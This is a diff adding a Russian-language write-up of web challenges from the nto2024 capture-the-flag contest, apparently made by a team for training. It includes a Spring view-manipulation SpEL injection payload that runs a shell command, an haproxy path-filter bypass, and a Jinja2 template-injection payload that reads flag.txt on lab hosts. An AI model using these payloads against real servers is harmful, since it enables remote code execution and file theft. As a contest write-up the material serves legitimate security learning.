@@ -1,30 +1,26 @@
 # nto2024
-<aside>
-💡 A standard operating procedure (SOP) is a set of step-by-step instructions compiled by an organization to help workers carry out routine operations. SOPs aim to achieve efficiency, quality output, and uniformity of performance, while reducing miscommunication and failure to comply with industry regulations.
+# Web1
 
-</aside>
+…
 
-# Document Purpose
+# Web2
 
-What is this document for?
+1) Декомпилировали .jar файл при помощи jd-gui утилиты linux
 
-# Document Scope
+2) Поняли, что используется фреймворк Spring
 
-What is the scenario which this SOP is applicable?
+3) Погуглили его уязвимости, нашли на [сайте](https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability) точно такой же обработчик, как в задании и поняли, что идем в правильном направлении (уязвимость spring view)
 
-# Definitions and Acronyms
+4) На этом же сайте был приложен эксплоит уязвимости, мы поменяли в нем `"touch execution"` на `"cat flag"`, потому что что делает первое мы не знаем, а второе выводит флаг
 
-| Term or Acronym | Definition or Meaning |
-| --- | --- |
-| Insert your term here | So that the reader understands the term or acronym. |
-|  |  |
+Ссылка: [`http://192.168.12.13:809](http://192.168.12.13:8090/)0/doc/__${T(java.lang.Runtime).getRuntime().exec("cat flag")}__::..x`
 
----
+# Web3
 
-# The Process Steps
+1) По конфигу прокси поняли, что haproxy запрещает доступ ко всем запросам, которые начинаются с `/flag`, попытались это обойти при помощи уязвимости Haproxy с переполнением Content-Length (request smuggling), но в итоге просто ввели [`http://192.168.12.11:8001/](http://192.168.12.11:8001/)/flag` и получили доступ
 
-https://miro.com/app/board/uXjVM-chCUk=/?share_link_id=977546363789
+2) В параметре name передают что-то, приложение банит какие-то особенные символы, в следсвтие чего мы подумали, что надо туда ввести что-нибудь, что выкинет нам содержимое flag.txt (не зря же он лежит в папке с приложением)
 
-# Related Resources
+3) Поняли, что в коде имя на страницу вставляется при помощи движка у flask, то есть благодаря Jinja2, [погуглили уязвимости](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti) и нашли эксплоит без запрещенных слов
 
--
+Ссылка:  [`http://192.168.12.11:8001//flag?name={{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }](http://192.168.12.11:8001//flag?name=%7B%7B%20get_flashed_messages.__globals__.__builtins__.open(%22flag.txt%22).read()%20%7D)}`
